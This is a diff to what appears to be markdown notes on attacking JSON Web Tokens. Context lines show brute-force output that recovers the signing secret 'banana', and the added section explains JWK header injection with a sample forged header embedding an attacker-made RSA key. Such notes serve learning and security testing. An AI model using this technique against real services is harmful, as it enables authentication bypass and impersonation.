@@ -20,3 +20,19 @@ SECRET FOUND: banana
 Time taken (sec): 0.123
 Total attempts: 20000
 ```
+
+4. `jwk header injection` - Create a new RSA key, use JWT editor, embed the jwk with your newly created RSA key and send the request.
+
+```json
+{
+    "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
+    "typ": "JWT",
+    "alg": "RS256",
+    "jwk": {
+        "kty": "RSA",
+        "e": "AQAB",
+        "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
+        "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m"
+    }
+}
+```
